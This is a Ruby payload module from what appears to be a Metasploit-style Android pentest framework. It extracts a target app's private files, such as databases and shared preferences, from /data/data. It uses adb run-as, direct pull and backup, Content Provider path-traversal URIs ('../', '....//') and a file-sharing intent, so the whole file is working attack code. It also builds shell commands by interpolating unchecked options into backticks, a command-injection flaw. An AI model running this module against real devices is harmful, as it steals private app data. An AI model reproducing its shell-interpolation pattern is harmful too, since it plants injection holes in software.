require_relative '../../../core/payload_base'

module MPF
  module Payloads
    module Singles
      module Android
        class FileExtraction < MPF::Core::PayloadBase
          
          def register_info
            @info = {
              name: 'Android File Extraction Payload',
              module: 'payload/android/singles/file_extraction',
              platform: :android,
              description: 'Extracts files from target application using path traversal or ' \
                          'Content Provider vulnerabilities. Supports databases, shared preferences, and custom files.',
              authors: ['MPF Research Team'],
              severity: 'high'
            }
            @payload_type = :single
          end

          def register_options
            add_option('TARGET_PACKAGE', 'Target application package name', required: true)
            add_option('TARGET_FILE', 'File path to extract (relative to app data)', required: true)
            add_option('EXTRACTION_METHOD', 'Method: provider, adb, intent', default: 'adb')
            add_option('TARGET_PROVIDER', 'Content Provider authority (if using provider method)', required: false)
            add_option('DEVICE', 'Target device ID', default: 'emulator-5554')
            add_option('OUTPUT_DIR', 'Local directory for extracted files', default: 'reports/payload/extracted')
          end

          def generate(opts = {})
            method = get_option('EXTRACTION_METHOD')
            target_file = get_option('TARGET_FILE')
            package = get_option('TARGET_PACKAGE')

            {
              type: 'file_extraction',
              method: method,
              target_file: target_file,
              full_path: "/data/data/#{package}/#{target_file}",
              description: "Extract #{target_file} using #{method} method"
            }
          end

          def execute(target_info)
            validation = validate
            unless validation[:valid]
              return { success: false, error: validation[:errors] }
            end

            package = get_option('TARGET_PACKAGE')
            target_file = get_option('TARGET_FILE')
            method = get_option('EXTRACTION_METHOD')
            device = get_option('DEVICE')
            output_dir = get_option('OUTPUT_DIR')

            print_status("Extracting file: #{target_file}")
            print_status("Method: #{method}")

            # Create output directory
            `mkdir -p #{output_dir}` unless Dir.exist?(output_dir)

            result = case method
            when 'adb'
              extract_via_adb(package, target_file, device, output_dir)
            when 'provider'
              extract_via_provider(package, target_file, device, output_dir)
            when 'intent'
              extract_via_intent(package, target_file, device, output_dir)
            else
              { success: false, error: "Unknown extraction method: #{method}" }
            end

            if result[:success]
              print_good("File extraction successful!")
              {
                success: true,
                extracted_file: result[:local_path],
                file_size: result[:size],
                method: method,
                impact: 'Sensitive file extracted from application'
              }
            else
              print_error("File extraction failed")
              result
            end
          end

          private

          def extract_via_adb(package, target_file, device, output_dir)
            print_status("Attempting extraction via ADB...")
            
            remote_path = "/data/data/#{package}/#{target_file}"
            local_filename = File.basename(target_file)
            local_path = File.join(output_dir, local_filename)

            # Try run-as method (works if app is debuggable)
            cmd = "adb -s #{device} shell run-as #{package} cat #{target_file}"
            output = `#{cmd} 2>&1`

            if $?.success? && !output.include?('run-as: Package')
              File.write(local_path, output)
              print_good("Extracted via run-as (app is debuggable)")
              return {
                success: true,
                local_path: local_path,
                size: File.size(local_path),
                method: 'run-as'
              }
            end

            # Try direct pull (works on rooted devices or emulators)
            cmd = "adb -s #{device} pull #{remote_path} #{local_path}"
            output = `#{cmd} 2>&1`

            if $?.success? && File.exist?(local_path)
              print_good("Extracted via direct pull")
              return {
                success: true,
                local_path: local_path,
                size: File.size(local_path),
                method: 'pull'
              }
            end

            # Try backup method
            print_status("Trying backup method...")
            backup_result = extract_via_backup(package, device, output_dir)
            return backup_result if backup_result[:success]

            {
              success: false,
              error: 'All ADB extraction methods failed. App may not be debuggable and device may not be rooted.'
            }
          end

          def extract_via_provider(package, target_file, device, output_dir)
            provider = get_option('TARGET_PROVIDER')
            
            unless provider
              return { success: false, error: 'TARGET_PROVIDER required for provider method' }
            end

            print_status("Attempting extraction via Content Provider...")

            # Try path traversal
            traversal_paths = [
              "../#{target_file}",
              "../../#{target_file}",
              "../../../#{target_file}",
              "....//....//#{target_file}"
            ]

            traversal_paths.each do |path|
              uri = "content://#{provider}/#{path}"
              local_filename = File.basename(target_file)
              local_path = File.join(output_dir, local_filename)

              cmd = "adb -s #{device} shell content read --uri #{uri}"
              output = `#{cmd} 2>&1`

              if $?.success? && !output.include?('Error') && output.length > 0
                File.write(local_path, output)
                print_good("Extracted via Content Provider path traversal")
                return {
                  success: true,
                  local_path: local_path,
                  size: File.size(local_path),
                  method: 'provider_traversal',
                  traversal_path: path
                }
              end
            end

            {
              success: false,
              error: 'Content Provider extraction failed. Provider may validate paths.'
            }
          end

          def extract_via_intent(package, target_file, device, output_dir)
            print_status("Attempting extraction via Intent...")

            # Create file:// URI
            file_uri = "file:///data/data/#{package}/#{target_file}"
            
            # Try to trigger file sharing intent
            cmd = "adb -s #{device} shell am start -a android.intent.action.SEND " \
                  "-t '*/*' --eu android.intent.extra.STREAM '#{file_uri}' #{package}"
            output = `#{cmd} 2>&1`

            if $?.success? && !output.include?('Error')
              print_warning("Intent sent - manual extraction may be required")
              return {
                success: true,
                method: 'intent',
                note: 'File sharing intent triggered. Check device for file sharing dialog.'
              }
            end

            {
              success: false,
              error: 'Intent-based extraction failed'
            }
          end

          def extract_via_backup(package, device, output_dir)
            print_status("Creating backup...")
            
            backup_file = File.join(output_dir, "#{package}.ab")
            
            # Create backup (requires user confirmation on device)
            cmd = "adb -s #{device} backup -f #{backup_file} #{package}"
            print_warning("Backup requires user confirmation on device...")
            output = `#{cmd} 2>&1`

            if File.exist?(backup_file) && File.size(backup_file) > 0
              print_good("Backup created successfully")
              
              # Extract backup (requires additional tools)
              print_status("Backup created at: #{backup_file}")
              print_status("Use 'abe.jar' or similar tool to extract backup contents")
              
              return {
                success: true,
                local_path: backup_file,
                size: File.size(backup_file),
                method: 'backup',
                note: 'Backup file created. Extract with Android Backup Extractor.'
              }
            end

            {
              success: false,
              error: 'Backup creation failed or was cancelled by user'
            }
          end

          def print_status(msg)
            puts "[*] #{msg}"
          end

          def print_good(msg)
            puts "[+] #{msg}"
          end

          def print_warning(msg)
            puts "[!] #{msg}"
          end

          def print_error(msg)
            puts "[-] #{msg}"
          end
        end
      end
    end
  end
end
